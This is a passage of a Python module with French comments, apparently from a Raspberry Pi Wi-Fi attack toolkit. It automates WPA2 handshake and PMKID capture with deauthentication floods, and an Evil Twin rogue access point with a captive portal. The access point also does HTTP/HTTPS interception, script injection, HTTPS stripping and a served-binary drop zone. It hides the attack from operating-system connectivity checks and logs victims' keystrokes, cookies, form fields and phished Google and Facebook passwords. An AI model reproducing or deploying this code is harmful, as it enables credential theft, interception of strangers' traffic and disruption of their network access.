            if task: task.log(m, level=lvl)

        results = []

        # Étape 1 : PMKID (rapide)
        if _which("hcxdumptool"):
            _l(f"=== Étape 1/2 : PMKID sur {target['essid']} ===")
            pmk_res = self._pmkid(bssid, duration)
            results.append(("pmkid", pmk_res))
            got_pmkid = pmk_res.get("ok") and pmk_res.get("pmkid", {}).get("found")
            if got_pmkid:
                _l("✅ PMKID capturé en étape 1 — STOP, succès.", "info")
                return {"ok": True, "winner": "pmkid",
                        "results": results, "target": target,
                        "message": pmk_res.get("message", "PMKID capturé.")}
            _l("PMKID KO (AP n'expose pas) — passage étape 2.", "warn")
        else:
            _l("hcxdumptool absent → skip PMKID, direct handshake.", "warn")

        if task and task.is_stopped():
            return {"ok": True, "winner": None, "results": results,
                    "message": "Arrêté par l'utilisateur."}

        # Étape 2 : handshake_deauth broadcast
        _l(f"=== Étape 2/2 : Handshake + deauth broadcast sur {target['essid']} ===")
        hs_res = self._handshake_deauth(bssid, duration, client="", count=10)
        results.append(("handshake_deauth", hs_res))
        got_hs = hs_res.get("ok") and hs_res.get("handshake", {}).get("found")
        if got_hs:
            _l("✅ Handshake capturé en étape 2 — succès.", "info")
            return {"ok": True, "winner": "handshake_deauth",
                    "results": results, "target": target,
                    "message": hs_res.get("message", "Handshake capturé.")}

        _l("Toutes les étapes ont échoué.", "warn")
        return {"ok": True, "winner": None, "results": results,
                "target": target,
                "message": (f"Auto-attack sur <b>{escape(target['essid'])}</b> : "
                            "aucune attaque n'a abouti.\n"
                            "PMKID + handshake KO → la cible résiste (PMKID désactivé "
                            "+ aucun client n'a tenté de se reconnecter pendant le deauth).\n"
                            "Pistes : augmente la durée, ou ajoute un deauth ciblé sur "
                            "un client spécifique (action `Handshake WPA2 — deauth`).")}

    def _handshake_passive(self, bssid: str, duration: int) -> Dict[str, Any]:
        err = self._preflight()
        if err:
            return err
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        iface = self._iface()
        cap_path = _run_airodump_session(
            iface, duration,
            output_prefix=HS_PREFIX, output_format="pcap",
            bssid=target["bssid"], channel=target["channel"],
        )
        return self._handshake_result(target, duration, cap_path, deauth_used=False)

    def _handshake_deauth(self, bssid: str, duration: int,
                          client: str, count: int) -> Dict[str, Any]:
        err = self._preflight()
        if err:
            return err
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        iface = self._iface()
        client_mac = client.strip() if client and client.strip() != "*" else ""
        out = _capture_with_deauth(
            iface=iface, bssid=target["bssid"], channel=target["channel"],
            duration=duration, deauth_count=count, client_mac=client_mac,
        )
        target_txt = client_mac or "broadcast"
        return self._handshake_result(target, duration, out["cap"],
                                      deauth_used=True,
                                      deauth_info=f"deauth → {target_txt} (×{count})")

    def _handshake_result(self, target: Dict[str, Any], duration: int,
                          cap_path: Optional[Path], deauth_used: bool,
                          deauth_info: str = "") -> Dict[str, Any]:
        """Branche commune handshake : parse .cap + format message (sans ✓)."""
        if cap_path is None:
            return {"ok": False, "error": "Aucun .cap produit."}
        hs = _has_handshake(cap_path)
        suffix = f" — {deauth_info}" if deauth_info else ""
        stored_path: Optional[Path] = None
        if hs["found"]:
            # ★ Persistance : copier dans ~/nexuspi-data/captures/<BSSID>/handshakes/
            stored_path = memory.store_handshake(
                bssid=target["bssid"], essid=target["essid"],
                channel=target["channel"], encryption=target.get("encryption", ""),
                cap_path=cap_path,
            )
            msg = (f"Handshake capturé sur <b>{escape(target['essid'])}</b>{suffix}.\n"
                   f"BSSID {target['bssid']} ch {target['channel']}\n"
                   f"Archivé en mémoire : <b>{stored_path}</b>\n"
                   f"Ouvre la carte <b>Mémoire</b> pour télécharger.")
        else:
            hint = ("Vérifie qu'au moins un client est associé à cet AP (action clients)."
                    if deauth_used else
                    "Aucune (re)connexion captée. Lance la version deauth pour forcer.")
            msg = f"Pas de handshake en {duration}s{suffix}.\n{hint}"
        return {
            "ok": True, "target": target, "duration": duration,
            "handshake": hs, "cap": str(cap_path),
            "stored": str(stored_path) if stored_path else None,
            "message": msg,
        }

    def _pmkid(self, bssid: str, duration: int) -> Dict[str, Any]:
        err = self._preflight()
        if err:
            return err
        if not _which("hcxdumptool"):
            return {"ok": False, "error": "hcxdumptool absent."}
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        iface = self._iface()
        pcap = _run_hcxdumptool_pmkid(iface, target["bssid"],
                                      target["channel"], duration)
        if pcap is None:
            return {"ok": False,
                    "error": "Aucun pcapng produit (BPF KO ou capture vide)."}
        pmk = _extract_pmkid(pcap)
        stored: Dict[str, Optional[Path]] = {}
        if pmk.get("found"):
            # ★ Persistance pcapng + hash 22000
            stored = memory.store_pmkid(
                bssid=target["bssid"], essid=target["essid"],
                channel=target["channel"], encryption=target.get("encryption", ""),
                pcap_path=pcap, hash_path=PMKID_22000,
            )
            msg = (f"PMKID capturé sur <b>{escape(target['essid'])}</b> "
                   f"(BSSID {target['bssid']}).\n"
                   f"Archivé : <b>{stored.get('22000')}</b>\n"
                   f"Ouvre la carte <b>Mémoire</b> pour télécharger.")
        else:
            err_extra = pmk.get("error", "")
            msg = (f"Pas de PMKID obtenu en {duration}s sur "
                   f"<b>{escape(target['essid'])}</b>.\n"
                   "L'AP a peut-être PMKID désactivé (cas fréquent depuis 2019)."
                   + (f"\n[{err_extra}]" if err_extra else ""))
        return {"ok": True, "target": target, "duration": duration,
                "pmkid": pmk, "message": msg}

    # ── Evil Twin (rogue AP + captive portal) ──────────────────────────────

    def _eviltwin(self, bssid: str, duration: int, *,
                  custom_ssid: str = "", template: str = "wifi-auth",
                  custom_portal_html: str = "",
                  portal_name: str = "",
                  auth_mode: str = "open", wpa2_password: str = "",
                  mode: str = "captive",
                  inject_script: str = "",
                  payload_preset: str = "",
                  strip_https: str = "no",
                  deauth_pre_seconds: int = 0,
                  deauth_continuous: str = "no",
                  deauth_target_client: str = "") -> Dict[str, Any]:
        task = current_task()
        def _log(m, lvl="info"):
            if task: task.log(m, level=lvl)

        combined_js = _payloads.resolve_multi(payload_preset, inject_script)
        if combined_js:
            inject_script = combined_js
            presets = [p for p in payload_preset.split(",") if p.strip() and p.strip() != "custom"]
            if presets:
                _log(f"Payloads actifs : {', '.join(presets)}")
        err = self._preflight()
        if err:
            return err
        if not (_which("hostapd") and _which("dnsmasq")):
            return {"ok": False,
                    "error": "hostapd + dnsmasq requis (sudo apt install -y hostapd dnsmasq)."}
        if mode in ("mitm", "mitm_https") and not _which("tcpdump"):
            return {"ok": False,
                    "error": "tcpdump requis (sudo apt install -y tcpdump)."}
        if mode == "mitm_https" and not _which("mitmdump"):
            return {"ok": False,
                    "error": "mitmproxy requis pour mitm_https (sudo apt install -y mitmproxy)."}
        target = self._resolve_target(bssid)
        if target is None:
            if not self._last_aps:
                _log("Aucun AP en cache — auto-scan rapide (5s)…")
                self._scan(5)
                target = self._resolve_target(bssid)
            if target is None:
                return {"ok": False,
                        "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        if not ET_PORTAL_SCRIPT.exists() and mode in ("captive", "captive_nat"):
            return {"ok": False,
                    "error": f"captive_portal.py introuvable ({ET_PORTAL_SCRIPT})."}

        # ── Résolution des params ─────────────────────────────────────
        ssid = (custom_ssid or "").strip() or target["essid"]
        if auth_mode == "wpa2":
            if not (8 <= len(wpa2_password) <= 63):
                return {"ok": False,
                        "error": "Mdp WPA2 invalide (hostapd exige 8-63 caractères)."}
        # Custom portal HTML
        if template == "custom" and custom_portal_html.strip():
            ET_DIR.mkdir(parents=True, exist_ok=True)
            (ET_DIR / "custom_portal.html").write_text(
                custom_portal_html, encoding="utf-8")
            _log("Template portail personnalisé chargé")
        elif template == "custom":
            template = "wifi-auth"
        if template not in VALID_TEMPLATES:
            template = "wifi-auth"
        if mode not in {"captive", "captive_nat", "mitm", "mitm_https"}:
            mode = "captive_nat"

        iface = self._iface()
        ET_DIR.mkdir(parents=True, exist_ok=True)
        # Drop zone des binaires (APK/EXE) servis via captive_portal /dl/<...>
        (Path.home() / "nexuspi-data" / "payloads").mkdir(parents=True, exist_ok=True)
        portal_log = ET_DIR / f"creds_{time.strftime('%Y%m%d_%H%M%S')}.log"
        sniff_pcap = ET_DIR / f"sniff_{time.strftime('%Y%m%d_%H%M%S')}.pcap"
        portal_log.write_text("", encoding="utf-8")
        # Reset leases file pour avoir une vue propre du run courant
        ET_DNSMASQ_LEASES.write_text("", encoding="utf-8")

        procs: List[subprocess.Popen] = []
        nat_active = False
        deauth_cont_proc = None  # Subprocess aireplay-ng continu (wlan0)
        try:
            _log("Killing NetworkManager / wpa_supplicant / dhcpcd…")
            _run(["sudo", "-n", "airmon-ng", "check", "kill"], timeout=15)

            # ── Pré-deauth burst : éjecte la cible du vrai AP avant le rogue
            if deauth_pre_seconds > 0:
                _log(f"⚡ Pré-deauth {deauth_pre_seconds}s sur "
                     f"{target['bssid']} ch{target['channel']} "
                     "(éjecte les clients du vrai AP)")
                _run(["sudo", "-n", "ip", "link", "set", iface, "down"], timeout=5)
                _run(["sudo", "-n", "iw", "dev", iface, "set", "type", "monitor"],
                     timeout=5)
                _run(["sudo", "-n", "ip", "link", "set", iface, "up"], timeout=5)
                _run(["sudo", "-n", "iw", "dev", iface, "set", "channel",
                      str(target["channel"])], timeout=5)
                # aireplay-ng -0 0 = infini, on stoppe via timeout
                _run(["sudo", "-n", "timeout", str(deauth_pre_seconds),
                      "aireplay-ng", "-0", "0",
                      "-a", target["bssid"], iface],
                     timeout=deauth_pre_seconds + 5)
                _log("Pré-deauth terminé — bascule vers rogue AP maintenant")

            _log(f"Configuration wlan1 : {ET_IP}/{ET_PREFIX} en managed mode")
            _run(["sudo", "-n", "ip", "link", "set", iface, "down"], timeout=5)
            _run(["sudo", "-n", "iw", "dev", iface, "set", "type", "managed"],
                 timeout=5)
            _run(["sudo", "-n", "ip", "addr", "flush", "dev", iface], timeout=5)
            _run(["sudo", "-n", "ip", "addr", "add",
                  f"{ET_IP}/{ET_PREFIX}", "dev", iface], timeout=5)
            _run(["sudo", "-n", "ip", "link", "set", iface, "up"], timeout=5)

            self._write_hostapd_conf(iface, ssid, target["channel"],
                                     auth_mode=auth_mode,
                                     wpa2_password=wpa2_password)
            # DNS hijack uniquement en mode captive pur (sinon internet HTTPS KO)
            self._write_dnsmasq_conf(iface, hijack_dns=(mode == "captive"))
            _log(f"hostapd.conf + dnsmasq.conf écrits (DNS hijack={mode=='captive'})")

            _log(f"Lancement hostapd (SSID={ssid!r}, ch={target['channel']}, auth={auth_mode})")
            procs.append(subprocess.Popen(
                ["sudo", "-n", "hostapd", str(ET_HOSTAPD_CONF)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            ))
            if task and not task.wait(3):
                _log("Stop demandé pendant l'init hostapd", "warn")
                raise _StopRequested()
            elif not task:
                time.sleep(3)

            _log("Lancement dnsmasq (DHCP+DNS)")
            procs.append(subprocess.Popen(
                ["sudo", "-n", "dnsmasq", "--no-daemon",
                 "--conf-file=" + str(ET_DNSMASQ_CONF)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            ))

            if mode == "captive":
                _log(f"Lancement captive portal port 80 (template={template})")
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "python3", str(ET_PORTAL_SCRIPT),
                     str(portal_log), "80", template, ssid, portal_name],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
            elif mode == "captive_nat":
                # Captive portal + vrai internet via NAT.
                # iptables REDIRECT port 80 → port 80 local (force HTTP probes
                # vers le portail). HTTPS passe en NAT normal → vraie navigation.
                _log("Mode CAPTIVE+NAT : internet HTTPS marche, HTTP forcé vers portail")
                self._enable_nat(iface, ET_UPSTREAM_IFACE)
                nat_active = True
                # Bind le portail sur 8080 et redirige 80 → 8080
                # (sinon conflit avec d'autres services qui voudraient le 80)
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "python3", str(ET_PORTAL_SCRIPT),
                     str(portal_log), "8080", template, ssid, portal_name],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
                time.sleep(1)
                self._enable_http_redirect(iface, 8080)
                _log("iptables : tout HTTP (port 80) routé vers le portail")
            elif mode == "mitm":
                _log("Mode MITM HTTP : NAT activé + tcpdump démarré")
                self._enable_nat(iface, ET_UPSTREAM_IFACE)
                nat_active = True
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "tcpdump", "-i", iface,
                     "-w", str(sniff_pcap), "-U",
                     "-n", "not arp"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
                # Serveur /exfil sur 8081 (pour les payloads qui POSTent)
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "python3", str(ET_PORTAL_SCRIPT),
                     str(portal_log), "8081", "exfil", ssid],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
                if inject_script.strip() or strip_https == "yes":
                    inj_env = os.environ.copy()
                    inj_env["NEXUSPI_STRIP_HTTPS"] = "1" if strip_https == "yes" else ""
                    _log(f"Proxy HTTP activé (inject={bool(inject_script.strip())}, "
                         f"strip_https={strip_https == 'yes'})")
                    procs.append(subprocess.Popen(
                        ["sudo", "-n", "-E", "python3", str(ET_INJECT_SCRIPT),
                         str(ET_INJECT_PORT), inject_script or ""],
                        env=inj_env,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    ))
                    time.sleep(1)
                    self._enable_http_redirect(iface, ET_INJECT_PORT)
            else:  # mode == "mitm_https"
                _log("Mode MITM HTTPS : mitmproxy transparent + tcpdump")
                self._enable_nat(iface, ET_UPSTREAM_IFACE)
                nat_active = True
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "tcpdump", "-i", iface,
                     "-w", str(sniff_pcap), "-U",
                     "-n", "not arp"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
                # Serveur /exfil sur 8081 (idem mitm)
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "python3", str(ET_PORTAL_SCRIPT),
                     str(portal_log), "8081", "exfil", ssid],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
                mitm_env = os.environ.copy()
                mitm_env["NEXUSPI_INJECT"] = inject_script
                mitm_env["NEXUSPI_STRIP_HTTPS"] = "1" if strip_https == "yes" else ""
                _log(f"Lancement mitmdump (inject={bool(inject_script)}, "
                     f"strip_https={strip_https == 'yes'})")
                # Ignore les hosts qui font des probes de connectivité OS — ils
                # passent en clair vers les vrais serveurs (vrai 204) → l'OS
                # ne voit PAS le warning "pas d'internet".
                ignore_regex = (
                    r"(?i)("
                    r"connectivitycheck\.gstatic\.com|"
                    r"www\.gstatic\.com|"
                    r"clients[1-4]\.google\.com|"
                    r"captive\.apple\.com|"
                    r"www\.apple\.com|"
                    r"www\.msftconnecttest\.com|"
                    r"www\.msftncsi\.com|"
                    r"dns\.msftncsi\.com|"
                    r"detectportal\.firefox\.com|"
                    r"connectivitycheck\.platform\.hihonorcloud\.com|"
                    r"connectivitycheck\.android\.com|"
                    r"developers\.google\.cn"
                    r")"
                )
                procs.append(subprocess.Popen(
                    ["sudo", "-n", "-E", "mitmdump",
                     "--mode", "transparent",
                     "--showhost",
                     "--listen-port", str(ET_MITMPROXY_PORT),
                     "--set", f"ignore_hosts={ignore_regex}",
                     "-s", str(ET_MITMPROXY_ADDON),
                     "-q"],
                    env=mitm_env,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                ))
                time.sleep(2)
                self._enable_http_redirect(iface, ET_MITMPROXY_PORT)
                self._enable_https_redirect(iface, ET_MITMPROXY_PORT)
                _log("iptables : 80 et 443 routés vers mitmproxy:8080")

            # Deauth continu via wlan0 (Broadcom interne avec nexmon)
            if deauth_continuous == "yes":
                if Path("/sys/class/net/wlan0").exists():
                    try:
                        _log("⚡ Setup wlan0 pour deauth continu (Broadcom + nexmon)")
                        _run(["sudo", "-n", "ip", "link", "set", "wlan0", "down"], timeout=5)
                        _run(["sudo", "-n", "iw", "dev", "wlan0", "set", "type", "monitor"], timeout=5)
                        _run(["sudo", "-n", "ip", "link", "set", "wlan0", "up"], timeout=5)
                        _run(["sudo", "-n", "iw", "dev", "wlan0", "set", "channel",
                              str(target["channel"])], timeout=5)
                        deauth_cmd = ["sudo", "-n", "aireplay-ng", "-0", "0",
                                      "-a", target["bssid"]]
                        dtc = deauth_target_client.strip()
                        if dtc:
                            deauth_cmd += ["-c", dtc]
                        deauth_cmd.append("wlan0")
                        deauth_cont_proc = subprocess.Popen(
                            deauth_cmd,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        )
                        target_txt = dtc or "broadcast"
                        _log(f"✅ Deauth continu actif sur wlan0 → {target_txt} "
                             f"({target['bssid']}) ch{target['channel']}")
                    except Exception as e:
                        _log(f"⚠ Deauth continu impossible ({e}) — wlan0 incompatible. "
                             "Passe sans.", "warn")
                        deauth_cont_proc = None
                else:
                    _log("⚠ wlan0 introuvable → deauth continu impossible", "warn")

            _log(f"Rogue AP en service — fenêtre {duration}s. Connecte une victime.")
            self._monitor_loop(task, portal_log, ET_DNSMASQ_LEASES, duration)
        except _StopRequested:
            pass
        finally:
            _log("Cleanup : kill subprocesses + restore wlan1")
            # Stoppe le deauth continu en premier (avant que le rogue tombe)
            if deauth_cont_proc:
                try:
                    deauth_cont_proc.terminate()
                    deauth_cont_proc.wait(timeout=5)
                except (subprocess.TimeoutExpired, ProcessLookupError):
                    try: deauth_cont_proc.kill()
                    except Exception: pass
                except Exception:
                    pass
                # Restore wlan0 en mode managed
                try:
                    _run(["sudo", "-n", "ip", "link", "set", "wlan0", "down"], timeout=5)
                    _run(["sudo", "-n", "iw", "dev", "wlan0", "set", "type", "managed"], timeout=5)
                    _run(["sudo", "-n", "ip", "link", "set", "wlan0", "up"], timeout=5)
                except Exception:
                    pass
            # Cleanup processes
            for p in procs:
                try:
                    p.terminate()
                    p.wait(timeout=5)
                except (subprocess.TimeoutExpired, ProcessLookupError):
                    try:
                        p.kill()
                    except Exception:
                        pass
                except Exception:
                    pass
            for name in ("hostapd", "dnsmasq", "tcpdump"):
                subprocess.run(["sudo", "-n", "pkill", "-9", name],
                               capture_output=True, timeout=5)
            subprocess.run(["sudo", "-n", "pkill", "-9", "-f", "captive_portal"],
                           capture_output=True, timeout=5)
            # iptables REDIRECT cleanup (best-effort)
            if mode == "mitm" and (inject_script.strip() or strip_https == "yes"):
                self._disable_http_redirect(iface, ET_INJECT_PORT)
            if mode == "captive_nat":
                self._disable_http_redirect(iface, 8080)
            if mode == "mitm_https":
                self._disable_http_redirect(iface, ET_MITMPROXY_PORT)
                self._disable_https_redirect(iface, ET_MITMPROXY_PORT)
                subprocess.run(["sudo", "-n", "pkill", "-9", "mitmdump"],
                               capture_output=True, timeout=5)
            # NAT cleanup
            if nat_active:
                self._disable_nat(iface, ET_UPSTREAM_IFACE)
            # Restore wlan1
            _run(["sudo", "-n", "ip", "addr", "flush", "dev", iface], timeout=5)
            _run(["sudo", "-n", "iw", "dev", iface, "set", "type", "managed"],
                 timeout=5)
            _run(["sudo", "-n", "ip", "link", "set", iface, "down"], timeout=5)
            _run(["sudo", "-n", "ip", "link", "set", iface, "up"], timeout=5)

        # 8. Parse les soumissions / exfil / downloads (TSV: ts, ip, KIND, JSON, UA)
        import json as _json
        creds: List[Dict[str, Any]] = []
        exfil: List[Dict[str, Any]] = []
        downloads: List[Dict[str, Any]] = []
        if portal_log.exists():
            for line in portal_log.read_text(errors="replace").splitlines():
                parts = line.split("\t")
                if len(parts) < 4:
                    continue
                ts, ip, kind, data_json = parts[0], parts[1], parts[2], parts[3]
                ua = parts[4] if len(parts) > 4 else ""
                try:
                    fields = _json.loads(data_json)
                except Exception:
                    fields = {"raw": data_json}
                entry = {"ts": ts, "ip": ip, "fields": fields, "ua": ua}
                if kind == "EXFIL":
                    exfil.append(entry)
                elif kind == "DOWNLOAD":
                    downloads.append(entry)
                else:
                    creds.append(entry)

        leases: List[Dict[str, str]] = []
        if ET_DNSMASQ_LEASES.exists():
            for line in ET_DNSMASQ_LEASES.read_text(errors="replace").splitlines():
                # Format dnsmasq : <expiry> <mac> <ip> <hostname> <client_id>
                parts = line.split()
                if len(parts) >= 4:
                    leases.append({"mac": parts[1], "ip": parts[2],
                                   "hostname": parts[3]})

        # 9. Persistance en mémoire
        stored_creds = memory.store_eviltwin_creds(
            bssid=target["bssid"], essid=ssid,
            channel=target["channel"], encryption=target.get("encryption", ""),
            creds_log=portal_log if portal_log.stat().st_size > 0 else None,
        )
        stored_pcap = None
        if mode == "mitm" and sniff_pcap.exists() and sniff_pcap.stat().st_size > 100:
            stored_pcap = memory.store_eviltwin_pcap(
                bssid=target["bssid"], essid=ssid,
                channel=target["channel"],
                encryption=target.get("encryption", ""),
                pcap_path=sniff_pcap,
            )

        # Format message selon mode
        meta_txt = (f"SSID rogue : <b>{escape(ssid)}</b>"
                    f" · mode : <code>{mode}</code>"
                    f" · sécurité AP : <code>{auth_mode}</code>")
        if mode in ("captive", "captive_nat"):
            meta_txt += f" · template : <code>{template}</code>"

        # Lister les params IGNORÉS pour ce mode (évite la confusion utilisateur)
        ignored = []
        if mode in ("captive", "captive_nat"):
            if inject_script.strip():
                ignored.append("inject_script (pas de proxy MITM en captive)")
            if strip_https == "yes":
                ignored.append("strip_https (pas de proxy MITM en captive)")
            if payload_preset and payload_preset != "custom":
                ignored.append(f"payload_preset={payload_preset} (idem)")
        elif mode == "mitm":
            if template != "wifi-auth":
                ignored.append(f"template={template} (pas de portail en MITM)")
            # strip_https marche maintenant en mitm HTTP (rewrite des <a href> dans HTML)
        # mode mitm_https utilise tout

        lines = [f"Evil Twin terminé après {duration}s. {meta_txt}"]
        if ignored:
            lines.append("⚠ Params ignorés pour ce mode :")
            for ig in ignored:
                lines.append(f"  · {ig}")
        if leases:
            lines.append(f"\n{len(leases)} client(s) ayant pris un bail DHCP :")
            for l in leases:
                lines.append(f"  {escape(l['mac'])}  {escape(l['ip']):<15}  "
                             f"<b>{escape(l['hostname'])}</b>")
        else:
            lines.append("\nAucun client n'a pris de bail DHCP.")

        if creds:
            lines.append(f"\n{len(creds)} soumission(s) portail :")
            for c in creds:
                fields_txt = ", ".join(
                    f"<b>{escape(k)}</b>=<b>{escape(str(v))}</b>"
                    for k, v in c["fields"].items()
                )
                lines.append(f"  {escape(c['ts'])}  {escape(c['ip']):<15}  "
                             f"{fields_txt}")
        if exfil:
            lines.append(f"\n{len(exfil)} exfil payload(s) reçus :")
            for e in exfil:
                ftype = e["fields"].get("type", "?")
                summary_parts = []
                for k, v in e["fields"].items():
                    if k == "type":
                        continue
                    sv = str(v)
                    if len(sv) > 80:
                        sv = sv[:77] + "…"
                    summary_parts.append(f"<b>{escape(k)}</b>={escape(sv)}")
                lines.append(f"  {escape(e['ts'])}  {escape(e['ip']):<15}  "
                             f"[<b>{escape(ftype)}</b>] "
                             + ", ".join(summary_parts))
        if downloads:
            lines.append(f"\n{len(downloads)} fichier(s) téléchargé(s) :")
            for d in downloads:
                fname = d["fields"].get("file", "?")
                lines.append(f"  {escape(d['ts'])}  {escape(d['ip']):<15}  "
                             f"📦 <b>{escape(fname)}</b>")
        if mode != "captive":
            sz = sniff_pcap.stat().st_size if sniff_pcap.exists() else 0
            lines.append(f"\nCapture pcap : <b>{sniff_pcap}</b> ({sz} octets)")
            if stored_pcap:
                lines.append(f"Archivé pcap : <b>{stored_pcap}</b>")
            lines.append("À analyser côté PC : <code>wireshark</code> ou "
                         "<code>tshark -r &lt;pcap&gt; -Y http.request</code>")
        if stored_creds:
            lines.append(f"Archivé portail/exfil : <b>{stored_creds}</b>")
        if not creds and not exfil and mode == "captive":
            lines.append("\nAucune soumission au portail captif.")

        return {"ok": True, "target": target, "ssid_rogue": ssid,
                "mode": mode, "template": template, "auth_mode": auth_mode,
                "payload_preset": payload_preset,
                "duration": duration,
                "creds": creds, "exfil": exfil, "leases": leases,
                "creds_log": str(portal_log),
                "sniff_pcap": str(sniff_pcap) if mode != "captive" else None,
                "stored_creds": str(stored_creds) if stored_creds else None,
                "stored_pcap": str(stored_pcap) if stored_pcap else None,
                "message": "\n".join(lines)}

    # ── NAT helpers pour mode mitm ─────────────────────────────────────────

    def _enable_nat(self, in_iface: str, out_iface: str) -> None:
        """Active IP forwarding + MASQUERADE in_iface → out_iface."""
        _run(["sudo", "-n", "sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5)
        _run(["sudo", "-n", "iptables", "-t", "nat", "-A", "POSTROUTING",
              "-o", out_iface, "-j", "MASQUERADE"], timeout=5)
        _run(["sudo", "-n", "iptables", "-A", "FORWARD",
              "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"], timeout=5)
        _run(["sudo", "-n", "iptables", "-A", "FORWARD",
              "-i", out_iface, "-o", in_iface,
              "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
             timeout=5)

    def _disable_nat(self, in_iface: str, out_iface: str) -> None:
        """Retire les règles iptables + désactive IP forwarding."""
        _run(["sudo", "-n", "iptables", "-t", "nat", "-D", "POSTROUTING",
              "-o", out_iface, "-j", "MASQUERADE"], timeout=5)
        _run(["sudo", "-n", "iptables", "-D", "FORWARD",
              "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"], timeout=5)
        _run(["sudo", "-n", "iptables", "-D", "FORWARD",
              "-i", out_iface, "-o", in_iface,
              "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
             timeout=5)
        _run(["sudo", "-n", "sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)

    def _enable_http_redirect(self, in_iface: str, to_port: int) -> None:
        """Redirige le HTTP entrant sur wlan1 vers notre proxy local."""
        _run(["sudo", "-n", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-i", in_iface, "-p", "tcp", "--dport", "80",
              "-j", "REDIRECT", "--to-port", str(to_port)], timeout=5)

    def _disable_http_redirect(self, in_iface: str, to_port: int) -> None:
        _run(["sudo", "-n", "iptables", "-t", "nat", "-D", "PREROUTING",
              "-i", in_iface, "-p", "tcp", "--dport", "80",
              "-j", "REDIRECT", "--to-port", str(to_port)], timeout=5)

    def _enable_https_redirect(self, in_iface: str, to_port: int) -> None:
        """Redirige le HTTPS (443) → mitmproxy (qui gérera SNI + cert)."""
        _run(["sudo", "-n", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-i", in_iface, "-p", "tcp", "--dport", "443",
              "-j", "REDIRECT", "--to-port", str(to_port)], timeout=5)

    def _disable_https_redirect(self, in_iface: str, to_port: int) -> None:
        _run(["sudo", "-n", "iptables", "-t", "nat", "-D", "PREROUTING",
              "-i", in_iface, "-p", "tcp", "--dport", "443",
              "-j", "REDIRECT", "--to-port", str(to_port)], timeout=5)

    def _fmt_exfil_log(self, task, ip: str, data: Dict[str, Any]) -> None:
        """
        Affichage temps-réel détaillé par type d'exfil dans la console live.
        Chaque type a un emoji + formatage spécifique pour lire en un coup d'œil.
        """
        ftype = data.get("type", "?")
        url = data.get("url", "")
        title = data.get("title", "")
        # Extraire juste le domaine pour gagner de la place
        domain = ""
        if url:
            try:
                domain = url.split("//", 1)[1].split("/", 1)[0][:40]
            except Exception:
                domain = url[:40]

        if ftype == "keystroke":
            name = data.get("name", "?")
            val = str(data.get("value", ""))
            itype = data.get("input_type", "")
            # Masquer si c'est un champ password ? Non, on veut le voir
            emoji = "🔑" if itype == "password" else "⌨️"
            task.log(f"{emoji} {ip}  <b>{escape(name)}</b>"
                     f"<span style='color:#888'>({itype})</span>"
                     f" = <b>{escape(val)}</b>"
                     f"  <span style='color:#888'>@ {escape(domain)}</span>",
                     "info")

        elif ftype == "form_submit":
            action = str(data.get("action", ""))[:60]
            method = data.get("method", "?")
            fields = data.get("fields", {})
            pwd_fields = set(data.get("password_fields", []))
            parts = []
            for k, v in fields.items():
                marker = "🔑" if k in pwd_fields else ""
                parts.append(f"{marker}<b>{escape(k)}</b>=<b>{escape(str(v))}</b>")
            fields_txt = ", ".join(parts)[:400]
            task.log(f"📝 {ip}  <b>{method} → {escape(action)}</b>"
                     f"  <span style='color:#888'>({escape(domain)})</span>"
                     f"<br>     {fields_txt}", "info")

        elif ftype == "fake_update_click":
            tf = data.get("target_file", "?")
            ua = (data.get("ua", "") or "")[:80]
            task.log(f"🎯 {ip}  <b>CLICK fake_update</b> → {escape(tf)}"
                     f"  <span style='color:#888'>UA: {escape(ua)}</span>",
                     "info")

        elif ftype == "cookies":
            dom = data.get("domain", "?")
            cookies_str = str(data.get("cookies", ""))
            n_cookies = len([c for c in cookies_str.split(";") if c.strip()])
            ls = data.get("localStorage", {})
            try:
                if isinstance(ls, str):
                    import json as _j
                    ls = _j.loads(ls)
                n_ls = len(ls) if isinstance(ls, dict) else 0
            except Exception:
                n_ls = 0
            # Aperçu des cookies (truncated)
            cookies_preview = cookies_str[:120] + ("…" if len(cookies_str) > 120 else "")
            task.log(f"🍪 {ip}  cookies de <b>{escape(dom)}</b> : "
                     f"<b>{n_cookies}</b> cookie(s) + <b>{n_ls}</b> localStorage"
                     f"<br>     <span style='color:#888'>{escape(cookies_preview)}</span>",
                     "info")

        elif ftype == "phishing_google":
            email = data.get("email", "")
            pwd = data.get("password", "")
            task.log(f"🎣 {ip}  <b>GOOGLE phishing</b> → "
                     f"email=<b>{escape(email)}</b>  "
                     f"🔑 password=<b>{escape(pwd)}</b>"
                     f"  <span style='color:#888'>@ {escape(domain)}</span>",
                     "info")

        elif ftype == "phishing_facebook":
            email = data.get("email", "")
